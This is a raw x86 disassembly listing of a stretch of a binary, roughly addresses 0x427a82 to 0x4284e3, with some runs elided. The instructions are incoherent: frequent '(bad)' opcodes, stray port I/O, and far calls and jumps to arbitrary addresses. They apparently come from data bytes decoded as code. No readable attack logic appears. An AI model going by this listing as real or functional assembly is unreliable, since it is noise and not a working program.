  427a82:	in     al,dx
  427a83:	mov    ds:0xb7ff5ff0,al
  427a88:	cmp    al,dh
  427a8a:	cmp    al,0xc5
  427a8c:	mov    WORD PTR [ebx+eax*8+0x63aa6b0],fs
  427a93:	rcl    BYTE PTR [esi-0x4b],cl
  427a96:	test   BYTE PTR [esi+0x12],ch
  427a99:	mov    al,0x75
  427a9b:	xor    esi,eax
  427a9d:	in     al,0x3e
  427a9f:	lahf   
  427aa0:	fst    st(2)
  427aa2:	pop    ebp
  427aa3:	repnz cmp ebx,esp
  427aa6:	popf   
  427aa7:	lods   al,BYTE PTR ds:[esi]
  427aa8:	mov    esi,0xbfcd3e0f
  427aad:	push   ds
  427aae:	icebp  
  427aaf:	pop    edi
  427ab0:	add    eax,0xccffc756
	...
  427b15:	add    dl,cl
  427b17:	mov    edx,DWORD PTR [edx+0x7b]
  427b1a:	push   ebx
  427b1b:	sti    
  427b1c:	jmp    0x427ad9
  427b1e:	pop    edx
  427b1f:	dec    eax
  427b20:	pop    edx
  427b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b22:	shr    ecx,0xfc
  427b25:	and    dh,BYTE PTR [edx+0x70001a7]
  427b2b:	add    DWORD PTR [eax],eax
  427b2d:	add    BYTE PTR [ebx-0x7c7a9edf],dl
  427b33:	ins    BYTE PTR es:[edi],dx
  427b34:	cmp    BYTE PTR [ecx-0x4b5189a8],cl
  427b3a:	jne    0x427b14
  427b3c:	xchg   ecx,eax
  427b3d:	aam    0x7d
  427b3f:	xchg   esi,eax
  427b40:	add    al,0xe8
  427b42:	dec    ebx
  427b43:	outs   dx,DWORD PTR ds:[esi]
  427b44:	sbb    DWORD PTR ds:0xe36914ac,ecx
  427b4a:	imul   ebx,DWORD PTR [edx-0x32f4cb56],0x583f8f09
  427b54:	add    bl,ch
  427b56:	mov    eax,ds:0xb66bd5d5
  427b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b5c:	cmc    
  427b5d:	outs   dx,DWORD PTR ds:[esi]
  427b5e:	add    eax,0xfef951c0
  427b64:	jmp    0x427baa
  427b66:	clc    
  427b67:	mov    edi,0xee12fc53
  427b6c:	retf   
  427b6d:	ins    BYTE PTR es:[edi],dx
  427b6e:	in     al,dx
  427b6f:	aas    
  427b70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b71:	outs   dx,BYTE PTR ds:[esi]
  427b72:	outs   dx,BYTE PTR ds:[esi]
  427b73:	leave  
  427b74:	jns    0x427bb0
  427b76:	mov    esp,0x9fec0d59
  427b7b:	push   esi
  427b7c:	das    
  427b7d:	nop
  427b7e:	pop    ss
  427b7f:	jnp    0x427bcd
  427b81:	outs   dx,DWORD PTR ds:[esi]
  427b82:	outs   dx,BYTE PTR ds:[esi]
  427b83:	test   DWORD PTR es:[eax],0xbb0b9ee
  427b8a:	sub    DWORD PTR [ebx+0x50b6ca4c],0xffffffcd
  427b91:	out    0x37,al
  427b93:	inc    ecx
  427b94:	fdivr  QWORD PTR [edx-0x36]
  427b97:	and    ebx,0xfb298893
  427b9d:	dec    ebx
  427b9e:	scas   eax,DWORD PTR es:[edi]
  427b9f:	retf   0xf196
  427ba2:	test   eax,ebp
  427ba4:	(bad)  
  427ba5:	fcom   QWORD PTR [ebx+ecx*4+0x71147538]
  427bac:	or     esi,ebx
  427bae:	inc    esi
  427baf:	dec    edx
  427bb0:	or     al,BYTE PTR [esi-0x55]
  427bb3:	inc    ebx
  427bb4:	outs   dx,BYTE PTR ds:[esi]
  427bb5:	sub    DWORD PTR [eax-0x2a],eax
  427bb8:	icebp  
  427bb9:	jg     0x427b91
  427bbb:	repz xlat BYTE PTR ds:[ebx]
  427bbd:	popf   
  427bbe:	pop    esp
  427bbf:	pop    edi
  427bc0:	cmp    BYTE PTR [esi],dl
  427bc2:	or     DWORD PTR [eax+0x381e58a2],ecx
  427bc8:	jmp    0x427ba2
  427bca:	sahf   
  427bcb:	int    0xef
  427bcd:	arpl   WORD PTR [edi-0x15],dx
  427bd0:	xor    WORD PTR [ebp+0x62],cx
  427bd4:	dec    esp
  427bd5:	add    esp,DWORD PTR [edx-0x1e]
  427bd8:	mov    eax,DWORD PTR [edx-0x333e227b]
  427bde:	scas   al,BYTE PTR es:[edi]
  427bdf:	add    eax,0xc5d30036
  427be4:	or     ebp,DWORD PTR [ebp-0x693e18ef]
  427bea:	jmp    0x37edd5dd
  427bef:	fdiv   QWORD PTR [ecx]
  427bf1:	push   esp
  427bf2:	push   ecx
  427bf3:	lods   eax,DWORD PTR ds:[esi]
  427bf4:	mov    cl,0x79
  427bf6:	(bad)  
  427bf7:	and    BYTE PTR [ecx+edi*2+0x36],bl
  427bfb:	inc    eax
  427bfc:	call   0xb2bc:0x45631200
  427c03:	lock cmp esi,DWORD PTR [ecx]
  427c06:	ins    BYTE PTR es:[edi],dx
  427c07:	into   
  427c08:	sbb    eax,0x73c26f54
  427c0d:	lods   eax,DWORD PTR ds:[esi]
  427c0e:	or     ebp,ebp
  427c10:	push   0x16a2e26d
  427c15:	mov    cl,0x33
  427c17:	add    DWORD PTR [ebp-0x692b5eb1],esp
  427c1d:	into   
  427c1e:	imul   ebp,edi,0x51
  427c21:	add    esp,DWORD PTR [ebx+0x6391cc03]
  427c27:	mov    cl,0xe9
  427c29:	retf   
  427c2a:	jnp    0x427c6c
  427c2c:	sbb    BYTE PTR [ebx],dl
  427c2e:	inc    bh
  427c30:	sub    BYTE PTR [eax+0x4eb2ee],0x0
	...
  427c93:	add    BYTE PTR [eax],al
  427c95:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  427c9b:	jecxz  0x427c90
  427c9d:	lock xchg edi,eax
  427c9f:	fmul   DWORD PTR ds:0xf2688185
  427ca5:	dec    eax
  427ca6:	mov    ecx,0x70001a8
  427cab:	add    DWORD PTR [eax],eax
  427cad:	add    bl,dh
  427caf:	das    
  427cb0:	test   BYTE PTR ds:0x3e3f2c87,bl
  427cb6:	popf   
  427cb7:	mov    esi,0x8fa5a0f4
  427cbc:	or     al,0xc9
  427cbe:	jno    0x427d0a
  427cc0:	jg     0x427d32
  427cc2:	out    dx,eax
  427cc3:	cmp    DWORD PTR [esi],esp
  427cc5:	loop   0x427c48
  427cc7:	sbb    DWORD PTR [esi+0x28],edx
  427cca:	cdq    
  427ccb:	rol    ebp,0xa5
  427cce:	jne    0x427c9c
  427cd0:	and    BYTE PTR [ebx+0x41],ah
  427cd3:	mov    esp,ecx
  427cd5:	mov    ch,BYTE PTR [ebx+ecx*8]
  427cd8:	pop    ebx
  427cd9:	add    al,0x76
  427cdb:	push   0xfffffff7
  427cdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cde:	mov    DWORD PTR [ecx-0x504e4c1e],0xdbf81470
  427ce8:	mov    ds:0x97550802,al
  427ced:	xor    esp,ecx
  427cef:	xor    cl,BYTE PTR [ebp+0x4ec3da13]
  427cf5:	in     eax,0x9e
  427cf7:	dec    ecx
  427cf8:	pop    ebp
  427cf9:	xchg   DWORD PTR [eax],edi
  427cfb:	repnz sti 
  427cfd:	pop    esi
  427cfe:	out    dx,al
  427cff:	retf   
  427d00:	ins    DWORD PTR es:[edi],dx
  427d01:	or     eax,0xf1e7e391
  427d06:	push   esp
  427d07:	and    eax,0x95d92f4a
  427d0c:	shl    ebx,1
  427d0e:	int    0xe1
  427d10:	adc    DWORD PTR es:[edi],0xffffffb3
  427d14:	test   DWORD PTR [esi],0xd0236edc
  427d1a:	int    0xe3
  427d1c:	and    DWORD PTR [esi-0x58],ebx
  427d1f:	daa    
  427d20:	mov    esp,0x96a768ef
  427d25:	stos   BYTE PTR es:[edi],al
  427d26:	in     al,dx
  427d27:	(bad)  
  427d28:	or     dl,bh
  427d2a:	mov    bl,0xb1
  427d2c:	push   eax
  427d2d:	push   esp
  427d2e:	(bad)  
  427d2f:	mov    bh,BYTE PTR [edi-0x539ea884]
  427d35:	enter  0xfbbb,0x83
  427d39:	mov    edi,0xa70b4099
  427d3e:	rcl    BYTE PTR [eax-0x2],1
  427d41:	cwde   
  427d42:	mov    cl,0xb9
  427d44:	adc    DWORD PTR [ebx-0x4b],eax
  427d47:	out    dx,eax
  427d48:	pop    eax
  427d49:	and    BYTE PTR [eax],bh
  427d4b:	sub    al,al
  427d4d:	inc    ebx
  427d4e:	out    dx,al
  427d4f:	cmp    eax,0xb207ab13
  427d54:	stc    
  427d55:	scas   al,BYTE PTR es:[edi]
  427d56:	mov    ebp,DWORD PTR [ebp-0x61]
  427d59:	stos   DWORD PTR es:[edi],eax
  427d5a:	fcom   st(0)
  427d5c:	aad    0x6
  427d5e:	test   al,0x2d
  427d60:	pop    ebp
  427d61:	pop    edi
  427d62:	xchg   esp,eax
  427d63:	xor    al,0xbc
  427d65:	data16 add ch,BYTE PTR [esi]
  427d68:	xchg   ebx,eax
  427d69:	popa   
  427d6a:	xchg   esp,eax
  427d6b:	adc    bh,BYTE PTR [ecx+0x25e7e148]
  427d71:	inc    edx
  427d72:	lods   eax,DWORD PTR ds:[esi]
  427d73:	ins    BYTE PTR es:[edi],dx
  427d74:	fsubr  st,st(5)
  427d76:	sub    esi,ecx
  427d78:	sbb    esp,0x8e7d0885
  427d7e:	mov    ebp,0xc9be2c99
  427d83:	push   ecx
  427d84:	jg     0x427d29
  427d86:	sbb    BYTE PTR [ebx-0x23],bl
  427d89:	pop    edx
  427d8a:	pop    es
  427d8b:	gs mov eax,0x95962fce
  427d91:	and    ecx,DWORD PTR [ecx+0x24]
  427d94:	mov    edx,0x9c66ffab
  427d99:	test   eax,0x4098715c
  427d9e:	push   edx
  427d9f:	push   ebx
  427da0:	imul   eax,DWORD PTR [esi-0x63],0xae99dce9
  427da7:	dec    esi
  427da8:	dec    ebx
  427da9:	pop    es
  427daa:	mov    ds:0xdab0a579,al
  427daf:	fiadd  WORD PTR [ebx-0x28687e59]
	...
  427e15:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e1b:	cld    
  427e1c:	mov    ecx,0xf22c23f5
  427e21:	add    BYTE PTR [esi-0x17],ch
  427e24:	mov    cl,0xf2
  427e26:	shr    BYTE PTR [ecx+0x1070001],0x0
  427e2d:	add    BYTE PTR [edi-0x7851dc43],dh
  427e33:	xchg   edx,eax
  427e34:	push   esi
  427e35:	jb     0x427ea3
  427e37:	push   ecx
  427e38:	jbe    0x427ddf
  427e3a:	jae    0x427eb7
  427e3c:	loope  0x427e41
  427e3e:	inc    esi
  427e3f:	and    edi,DWORD PTR [esi-0x60fc4b6d]
  427e45:	pop    eax
  427e46:	jmp    0x427eab
  427e48:	rcl    dh,cl
  427e4a:	loopne 0x427df0
  427e4c:	xor    cl,bh
  427e4e:	mov    edx,0x6a4c87b2
  427e53:	add    DWORD PTR [ebx+eax*1-0x5a],edx
  427e57:	lea    edi,[ebx-0x2aa5d6cc]
  427e5d:	jecxz  0x427e42
  427e5f:	idiv   BYTE PTR [edi+0x6aa0a8a8]
  427e65:	jne    0x427e8e
  427e67:	mov    al,ds:0xa4060e9e
  427e6c:	mov    ds,WORD PTR [ecx]
  427e6e:	mov    esp,0xb5d14c91
  427e73:	mov    ch,cl
  427e75:	jae    0x427eba
  427e77:	pop    ebx
  427e78:	fiadd  WORD PTR [edx+0x25]
  427e7b:	xchg   esp,eax
  427e7c:	xchg   edx,eax
  427e7d:	call   0x81adbe74
  427e82:	aaa    
  427e83:	dec    edi
  427e84:	jne    0x427eab
  427e86:	mov    ah,0xff
  427e88:	mov    gs,WORD PTR [esi+0x72]
  427e8b:	sbb    al,0x9e
  427e8d:	in     al,dx
  427e8e:	dec    ebp
  427e8f:	cdq    
  427e90:	and    dh,BYTE PTR [ebp-0x4c910d9f]
  427e96:	mov    BYTE PTR [edi+0x78],ch
  427e99:	out    0x88,eax
  427e9b:	adc    DWORD PTR [ebp+0x28],edi
  427e9e:	xor    BYTE PTR [edi-0x37],dl
  427ea1:	(bad)  
  427ea2:	pop    esi
  427ea3:	xor    eax,0x7d7c0040
  427ea8:	or     ah,BYTE PTR [edi]
  427eaa:	xor    ebp,ecx
  427eac:	retf   
  427ead:	xor    BYTE PTR [ebx+0x20b595ea],bh
  427eb3:	and    al,0x69
  427eb5:	adc    DWORD PTR [esi-0x7a],ecx
  427eb8:	mov    ebp,0x66223785
  427ebd:	dec    edx
  427ebe:	and    BYTE PTR [edx],0x6
  427ec1:	mov    ecx,0x16ed0be8
  427ec6:	dec    DWORD PTR [edx]
  427ec8:	inc    eax
  427ec9:	adc    BYTE PTR [esi+0x62062a7c],ch
  427ecf:	pop    ebp
  427ed0:	sbb    DWORD PTR [edi+0x64],eax
  427ed3:	push   ebp
  427ed4:	outs   dx,BYTE PTR ds:[esi]
  427ed5:	test   ebp,edx
  427ed7:	mov    bl,0xcb
  427ed9:	inc    edi
  427eda:	sub    DWORD PTR [eax+ebp*1],ecx
  427edd:	(bad)  
  427edf:	retf   0xde64
  427ee2:	cs mov al,0x8c
  427ee5:	mov    eax,DWORD PTR [esi]
  427ee7:	aaa    
  427ee8:	push   edx
  427ee9:	std    
  427eea:	adc    BYTE PTR [ebx-0x3],cl
  427eed:	mov    edi,0x7bc313d5
  427ef2:	popaw  
  427ef4:	mov    eax,ds:0xd74d470c
  427ef9:	ss das 
  427efb:	mov    al,ds:0x87e87a31
  427f00:	dec    esp
  427f01:	dec    eax
  427f02:	push   edi
  427f03:	mov    al,0x23
  427f05:	ins    DWORD PTR es:[edi],dx
  427f06:	sahf   
  427f07:	aaa    
  427f08:	dec    ebx
  427f09:	sbb    ebp,DWORD PTR [eax+0x570ebf50]
  427f0f:	stos   BYTE PTR es:[edi],al
  427f10:	add    al,0xa8
  427f12:	cmc    
  427f13:	repz and al,0xfe
  427f16:	jmp    0x427ec6
  427f18:	(bad)  
  427f1a:	sbb    eax,0xc3388df8
  427f1f:	lock adc al,BYTE PTR [ebx+0x5f]
  427f23:	sar    ah,1
  427f25:	and    ah,cl
  427f27:	and    bl,BYTE PTR [eax]
  427f29:	jmp    0xd8553e78
  427f2e:	cmp    dh,ch
  427f30:	push   ebx
  427f31:	sub    al,0x6c
  427f33:	mov    ecx,0x7d
	...
  427f94:	add    BYTE PTR [eax],al
  427f96:	mov    cl,0xa7
  427f98:	dec    ebx
  427f99:	das    
  427f9a:	pop    edi
  427f9b:	out    dx,eax
  427f9c:	cmc    
  427f9d:	mov    edi,0x85e029ac
  427fa2:	jns    0x427fc9
  427fa4:	mov    ds:0x1aac749,eax
  427fa9:	add    BYTE PTR [edi],al
  427fab:	add    DWORD PTR [eax],eax
  427fad:	add    BYTE PTR [esi-0x21ffec9e],dh
  427fb3:	add    edi,DWORD PTR [esi-0x30]
  427fb6:	mov    ch,0x48
  427fb8:	imul   edx,esp,0x3a
  427fbb:	add    ah,dh
  427fbd:	std    
  427fbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427fbf:	xchg   ebx,eax
  427fc0:	mov    esi,DWORD PTR ds:0x343c5591
  427fc6:	std    
  427fc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427fc8:	test   DWORD PTR cs:[edi+edx*8],eax
  427fcc:	push   ebx
  427fcd:	mov    ds:0x6b2ee2fd,al
  427fd2:	mov    ds,WORD PTR [eax-0x26]
  427fd5:	mov    ebp,DWORD PTR [eax]
  427fd7:	aad    0xb0
  427fd9:	mov    cl,0x18
  427fdb:	ret    
  427fdc:	loope  0x427f8b
  427fde:	mov    al,0x33
  427fe0:	call   DWORD PTR [ebx+0x3e0a577b]
  427fe6:	jbe    0x428028
  427fe8:	mov    edx,0x14ab79b8
  427fed:	out    dx,al
  427fee:	and    edi,DWORD PTR [edx]
  427ff0:	mov    al,ds:0x96c20aab
  427ff5:	inc    eax
  427ff6:	mov    BYTE PTR [edx],0x55
  427ff9:	test   BYTE PTR [eax],bl
  427ffb:	push   esp
  427ffc:	pop    esp
  427ffd:	adc    esp,DWORD PTR [eax-0x54]
  428000:	sbb    edi,ebx
  428002:	call   0x7968:0x530ad5fc
  428009:	sahf   
  42800a:	pop    esp
  42800b:	push   0xffffffe7
  42800d:	mov    BYTE PTR es:[esi+0x2d75226e],dh
  428014:	mov    al,ds:0x33bc7bdb
  428019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42801a:	mov    dh,0x3f
  42801c:	xchg   BYTE PTR [ecx-0x706f814b],dh
  428022:	push   0x280dd65f
  428027:	and    DWORD PTR [edi+0x60],esp
  42802a:	stc    
  42802b:	jecxz  0x42808a
  42802d:	pop    ds
  42802e:	into   
  42802f:	outs   dx,BYTE PTR ds:[esi]
  428030:	xor    DWORD PTR ds:0xcbf15105,esp
  428036:	aad    0xb6
  428038:	lahf   
  428039:	push   ds
  42803a:	shl    BYTE PTR [ebp+0x37],1
  42803d:	hlt    
  42803e:	push   esp
  42803f:	jg     0x427fd3
  428041:	or     edx,esi
  428043:	cwde   
  428044:	aad    0x8d
  428046:	or     al,BYTE PTR [ebx]
  428048:	jl     0x427fdf
  42804a:	lods   al,BYTE PTR ds:[esi]
  42804b:	leave  
  42804c:	inc    edi
  42804d:	retf   
  42804e:	in     al,dx
  42804f:	test   BYTE PTR [eax],al
  428051:	or     eax,0xd90d8307
  428056:	adc    ch,BYTE PTR [ebp+0x59805dd2]
  42805c:	test   BYTE PTR [esi+0x3b59b300],0xff
  428063:	(bad)  
  428064:	fsub   QWORD PTR [edx-0x79]
  428067:	(bad)  
  428068:	shl    BYTE PTR [ebx+0x65],1
  42806b:	xchg   edi,eax
  42806c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42806d:	xor    DWORD PTR [ebx],ecx
  42806f:	mov    DWORD PTR [bx+si+0x4e],edx
  428073:	ficomp WORD PTR [esi]
  428075:	sbb    DWORD PTR [ebp-0x10ab59cb],esi
  42807b:	xchg   ebx,eax
  42807c:	inc    ebx
  42807d:	cdq    
  42807e:	xor    BYTE PTR ds:0xc7079c64,ch
  428084:	ret    
  428085:	aam    0xd4
  428087:	cwde   
  428088:	sbb    al,0xb0
  42808a:	sbb    edx,DWORD PTR [edi-0x5d471136]
  428090:	loop   0x4280e0
  428092:	sbb    esp,DWORD PTR [edi+esi*4+0xb83bab1]
  428099:	xor    eax,0xdae94a56
  42809e:	cmp    ch,BYTE PTR ds:0x7229ee31
  4280a4:	je     0x42811f
  4280a6:	lahf   
  4280a7:	cwde   
  4280a8:	aas    
  4280a9:	in     al,dx
  4280aa:	test   al,0xd
  4280ac:	inc    edx
  4280ad:	loopne 0x42805f
  4280af:	fsubr  st,st(7)
  4280b1:	push   esp
  4280b2:	in     al,0x1e
  4280b4:	and    eax,DWORD PTR [eax]
	...
  428116:	fucomip st,st(6)
  428118:	std    
  428119:	dec    esp
  42811a:	std    
  42811b:	pop    edi
  42811c:	(bad)  
  42811d:	(bad)  
  42811e:	cmp    al,0x36
  428120:	cmp    esp,ebp
  428122:	stc    
  428123:	imul   ecx,DWORD PTR [ecx+0x4b],0xffffffce
  428127:	stos   DWORD PTR es:[edi],eax
  428128:	add    DWORD PTR [eax],eax
  42812a:	pop    es
  42812b:	add    DWORD PTR [eax],eax
  42812d:	add    ah,cl
  42812f:	ja     0x428179
  428131:	pop    edx
  428132:	pushf  
  428133:	shl    DWORD PTR [eax-0x63a082d9],0xad
  42813a:	cmp    al,0xfb
  42813c:	clc    
  42813d:	pushf  
  42813e:	mov    esp,0x3bff3dfd
  428143:	jg     0x4280f8
  428145:	sub    bh,dl
  428147:	push   eax
  428148:	test   al,0x36
  42814a:	sbb    BYTE PTR [ebp+0x2dcde47a],dl
  428150:	lea    eax,[esi]
  428152:	xchg   edi,eax
  428153:	das    
  428154:	shr    DWORD PTR [edx+0x6c97e83],0x45
  42815b:	out    0xe9,al
  42815d:	pop    eax
  42815e:	retf   0xfef8
  428161:	mov    esi,0x1dc4129b
  428166:	cli    
  428167:	popf   
  428168:	fwait
  428169:	ror    cl,cl
  42816b:	and    al,0x7e
  42816d:	nop
  42816e:	mov    dl,0x28
  428170:	sahf   
  428171:	adc    eax,0x2b81cae2
  428176:	cmp    esp,DWORD PTR cs:[ecx+0x2fcb0f28]
  42817d:	js     0x428174
  42817f:	lods   al,BYTE PTR ds:[esi]
  428180:	mov    eax,0xa41aa9d5
  428185:	cmp    BYTE PTR [ebx-0x32],dl
  428188:	push   cs
  428189:	or     eax,0x8319cb6d
  42818e:	sub    eax,0xf881caed
  428193:	outs   dx,BYTE PTR ds:[esi]
  428194:	lds    esp,FWORD PTR [edi+0x66b28fc4]
  42819a:	not    BYTE PTR [ecx-0x7aac002d]
  4281a0:	rcr    DWORD PTR [eax+0x5138307],cl
  4281a6:	cs sbb BYTE PTR ss:[edi-0x143ef35b],bl
  4281ae:	imul   ebx,DWORD PTR [ecx],0x91bf5f0e
  4281b4:	fldenv [esi]
  4281b6:	aam    0x68
  4281b8:	mov    WORD PTR [edi+0x73],?
  4281bb:	fisub  WORD PTR [ebp-0x2337e084]
  4281c1:	in     eax,dx
  4281c2:	adc    DWORD PTR [eax+0x4784622a],ebx
  4281c8:	imul   ebx,DWORD PTR [esi+0x14c51b6d],0x47085281
  4281d2:	call   FWORD PTR [esi-0x3]
  4281d5:	push   ebx
  4281d6:	(bad)  
  4281d7:	bswap  edx
  4281d9:	hlt    
  4281da:	div    BYTE PTR [ebx]
  4281dc:	dec    ebx
  4281dd:	stos   BYTE PTR es:[edi],al
  4281de:	and    al,0xb3
  4281e0:	cmp    ch,cl
  4281e2:	ss cdq 
  4281e4:	ret    
  4281e5:	out    dx,al
  4281e6:	cmp    DWORD PTR [edi-0x46c103fe],esp
  4281ec:	leave  
  4281ed:	shl    BYTE PTR [eax-0x76f9bfff],1
  4281f3:	and    ebx,ebx
  4281f5:	cs xchg eax,edi
  4281f8:	push   esi
  4281fa:	xchg   edx,eax
  4281fb:	xchg   ecx,eax
  4281fc:	sahf   
  4281fd:	xor    ch,ah
  4281ff:	sub    ebx,edx
  428201:	push   es
  428202:	idiv   DWORD PTR [esi]
  428204:	in     eax,dx
  428205:	cmp    al,0xd3
  428207:	ins    BYTE PTR es:[edi],dx
  428208:	stos   DWORD PTR es:[edi],eax
  428209:	jg     0x428240
  42820b:	imul   eax,DWORD PTR [ebx+edi*1+0x7e97fe8a],0x65c86d14
  428216:	(bad)  
  428217:	mov    ah,0xe1
  428219:	ins    BYTE PTR es:[edi],dx
  42821a:	aad    0x57
  42821c:	pop    esp
  42821d:	and    ebx,edx
  42821f:	push   ds
  428220:	xor    ah,BYTE PTR [edi+0x4084c43e]
  428226:	stos   DWORD PTR es:[edi],eax
  428227:	cld    
  428228:	out    0xd2,al
  42822a:	ficom  WORD PTR [esi]
  42822c:	enter  0x6da1,0xcd
  428230:	ja     0x4281fc
  428232:	aad    0xbe
  428234:	sub    eax,0x0
	...
  428295:	add    bh,al
  428297:	fidiv  WORD PTR [esi]
  428299:	loop   0x4282da
  42829b:	jmp    0x52eb:0x1ad8ffd7
  4282a2:	add    BYTE PTR [ecx],0x36
  4282a5:	js     0x42827c
  4282a7:	lods   al,BYTE PTR ds:[esi]
  4282a8:	add    DWORD PTR [eax],eax
  4282aa:	pop    es
  4282ab:	add    DWORD PTR [eax],eax
  4282ad:	add    BYTE PTR [ebx-0x19],bh
  4282b0:	sbb    cl,0x29
  4282b3:	cmp    ah,ah
  4282b5:	pop    esi
  4282b6:	sbb    DWORD PTR [ebp+0x3a4dda2f],0xffffffbf
  4282bd:	push   0x19
  4282bf:	test   eax,0xccd34556
  4282c4:	out    dx,al
  4282c5:	xchg   ebp,eax
  4282c6:	mov    BYTE PTR [ecx+0x36],ah
  4282c9:	mov    ebp,0x983977d6
  4282ce:	push   ecx
  4282cf:	mov    al,ds:0xb170ab9d
  4282d4:	push   ebx
  4282d5:	mov    dh,0xb0
  4282d7:	pusha  
  4282d8:	rol    DWORD PTR [ebx+eax*4+0x2f4d6f77],cl
  4282df:	xchg   esp,edx
  4282e1:	sahf   
  4282e2:	(bad)  
  4282e4:	cmc    
  4282e5:	not    DWORD PTR ds:0xd7963ad6
  4282eb:	in     al,0xe5
  4282ed:	jmp    0xf439:0x147b3fe3
  4282f4:	into   
  4282f5:	jo     0x4282db
  4282f7:	sti    
  4282f8:	ds push edx
  4282fa:	div    DWORD PTR [ebx-0x2bb7a3f6]
  428300:	mov    ds,WORD PTR cs:[ebx+0x0]
  428304:	and    al,0xa4
  428306:	add    dh,bh
  428308:	adc    al,0x5a
  42830a:	inc    edi
  42830b:	and    bl,BYTE PTR [ebx]
  42830d:	pusha  
  42830e:	scas   eax,DWORD PTR es:[edi]
  42830f:	(bad)  
  428310:	adc    al,0x69
  428312:	xchg   ecx,eax
  428313:	cmp    ah,BYTE PTR [edx+0x2d659c9a]
  428319:	xchg   BYTE PTR [esp+ebp*4],ah
  42831c:	pop    ecx
  42831d:	mov    edi,0x45df1e8b
  428322:	or     bl,al
  428324:	das    
  428325:	push   0x2c90bbdf
  42832a:	test   edx,edx
  42832c:	jg     0x4283a8
  42832e:	push   eax
  42832f:	jae    0x42837b
  428331:	mov    ch,0x1e
  428333:	cmp    eax,0xb9c2bbe4
  428338:	pop    esp
  428339:	dec    eax
  42833a:	aaa    
  42833b:	fwait
  42833c:	mov    ebx,0x41d9008a
  428341:	pop    edx
  428342:	inc    edi
  428343:	push   ss
  428344:	jle    0x42839c
  428346:	icebp  
  428347:	jmp    0x88cd:0x10d85611
  42834e:	sar    DWORD PTR [esi],1
  428350:	mov    dh,BYTE PTR [esi+edi*1]
  428353:	sub    eax,0xb1f4699
  428358:	pop    eax
  428359:	pop    esi
  42835a:	lods   al,BYTE PTR ds:[esi]
  42835b:	sbb    ebx,DWORD PTR [ebx+0x0]
  42835e:	out    0x99,eax
  428360:	xchg   ecx,eax
  428361:	in     al,dx
  428362:	stos   BYTE PTR es:[edi],al
  428363:	adc    al,0x95
  428365:	pop    ecx
  428366:	adc    DWORD PTR [ebx+0x76b906d9],edi
  42836c:	pop    es
  42836d:	jg     0x42831f
  42836f:	ins    DWORD PTR es:[edi],dx
  428370:	nop
  428371:	into   
  428372:	imul   DWORD PTR [eax-0x47]
  428375:	xchg   DWORD PTR [ecx-0x417efa99],esp
  42837b:	adc    BYTE PTR ds:0xd85fb440,cl
  428381:	es xor al,0x3
  428384:	daa    
  428385:	aam    0x9c
  428387:	loope  0x42830b
  428389:	cmp    DWORD PTR [ebp+0x32eb2092],0x494ae5d6
  428393:	sahf   
  428394:	js     0x42837a
  428396:	js     0x428409
  428398:	add    esp,DWORD PTR [edi+0x5ab6223e]
  42839e:	mov    dl,0x84
  4283a0:	aam    0x94
  4283a2:	ret    0xd6c
  4283a5:	popf   
  4283a6:	or     eax,0x9564c553
  4283ab:	pop    esp
  4283ac:	outs   dx,BYTE PTR ds:[esi]
  4283ad:	sub    DWORD PTR [ebp-0x7242e9db],ecx
  4283b3:	xor    eax,DWORD PTR [ebx]
	...
  428415:	add    BYTE PTR [esi],cl
  428417:	xchg   esp,eax
  428418:	jg     0x42847d
  42841a:	(bad)  
  42841b:	jmp    0x42843b
  42841d:	std    
  42841e:	push   ebx
  42841f:	int    0x1
  428421:	inc    BYTE PTR [edi]
  428423:	pop    es
  428424:	sub    ebx,DWORD PTR [edi]
  428426:	fsubr  QWORD PTR [ebp+0x1070001]
  42842c:	add    BYTE PTR [eax],al
  42842e:	not    DWORD PTR [ebx+edx*4-0xb]
  428432:	cmp    ah,BYTE PTR [eax]
  428434:	mov    eax,ds:0x2ec71272
  428439:	bound  ebx,QWORD PTR [edx-0x29722298]
  42843f:	mov    eax,0xc6178597
  428444:	and    dh,BYTE PTR [ecx-0x5c2a6fdb]
  42844a:	mov    ch,0xa7
  42844c:	mov    cl,0x24
  42844e:	jmp    0x428476
  428450:	call   0xf66e:0x8de2646d
  428457:	mov    eax,0xd091a27
  42845c:	fs jle 0x428429
  42845f:	pop    ebx
  428460:	xchg   ecx,eax
  428461:	adc    ecx,DWORD PTR [edi-0x2752cd01]
  428467:	jmp    0x428483
  428469:	es push esi
  42846b:	mov    eax,ebp
  42846d:	ss bnd jns 0x42843e
  428471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428472:	add    edx,ebx
  428474:	or     al,0x34
  428476:	jns    0x42842b
  428478:	outs   dx,DWORD PTR ds:[esi]
  428479:	add    al,0x54
  42847b:	(bad)  
  42847d:	mov    ch,0x90
  42847f:	out    0x2d,eax
  428481:	call   0x9198:0x2ab326f6
  428488:	cmp    al,0xa1
  42848a:	jo     0x428426
  42848c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42848d:	jg     0x4284f4
  42848f:	mov    esi,0x226076ef
  428494:	xlat   BYTE PTR ss:[bx]
  428497:	pinsrw mm4,WORD PTR [edi+ecx*2],0x94
  42849c:	pop    edx
  42849d:	xor    eax,0xb85b9e09
  4284a2:	imul   eax,DWORD PTR [ebp-0x12],0x7ccef1c7
  4284a9:	jae    0x4284a0
  4284ab:	add    BYTE PTR [edx-0x3],0xda
  4284af:	jae    0x42849b
  4284b1:	lods   eax,DWORD PTR ds:[esi]
  4284b2:	jmp    0x42843c
  4284b4:	mov    edi,0x1a54a3f4
  4284b9:	repnz test BYTE PTR [ecx+0x423b5fc],dh
  4284c0:	jmp    0x178c5ba1
  4284c5:	sub    eax,0xf3e07faf
  4284ca:	cmp    BYTE PTR [edx-0x4e],ah
  4284cd:	cdq    
  4284ce:	jle    0x4284c0
  4284d0:	pop    ebp
  4284d1:	jno    0x428515
  4284d3:	prefetcht1 BYTE PTR [edi-0x60b076df]
  4284da:	lea    ebx,[ebp+eiz*1-0x7]
  4284de:	call   0x359452e3
  4284e3:	ins    BYTE PTR es:[edi],dx
